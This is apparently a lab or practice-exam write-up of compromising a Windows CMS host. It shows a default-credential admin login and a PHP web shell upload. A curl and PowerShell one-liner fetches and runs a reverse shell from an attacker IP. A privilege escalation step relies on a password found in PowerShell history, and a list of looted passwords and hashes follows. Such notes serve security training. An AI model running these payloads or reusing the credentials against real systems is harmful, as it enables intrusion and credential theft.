# Exploitation
- Navigate to `http://192.168.209.249:8000/cms/admin.php` to find the login panel for Admin. Use the default credential `admin:admin` to log in as `Administrator`.![[Pasted image 20240219195145.png]]
- Run `echo "<?php echo system(\$_REQUEST['cmd']); ?>" > shell.pHp` to create web shell payload. Then click on `Admin` and then `File Manager` to upload web shell.![[Pasted image 20240219195320.png]]![[Pasted image 20240219195337.png]]![[Pasted image 20240219195359.png]]![[Pasted image 20240219195420.png]]
- Finally, run `curl http://192.168.209.249:8000/cms/media/shell.pHp?cmd=powershell.exe%20-nop%20-w%20hidden%20-c%20iex%28iwr%20http%3A%2F%2F192.168.45.195%2FWindows%2Fnishang%2FShells%2FInvoke-ConPtyShell.ps1%20-UseBasicParsing%29%3B%20Invoke-ConPtyShell%20192.168.45.195%20443` to get a shell as local user  `legacy\adrian`.![[Pasted image 20240219195747.png]]
# PrivEsc
- By viewing PowerShell History at `C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` when can find another set of credential `damon:i6yuT6tym@`.
	- `winpeas` will identify that `damon` is part of the local administrator group. Hence, can `rdp` to bypass `UAC`
# Loot
- `damon`: i6yuT6tym@
- `adrian`: e3cea06e2de8d54d43b84d4b5bffb5b0
- `Administrator`: 387aef0561b65e4f3cae0960b0fba2d5
- `maildmz@relia.com`: DPuBT9tGCBrTbR
	- ![[Pasted image 20240219210935.png]]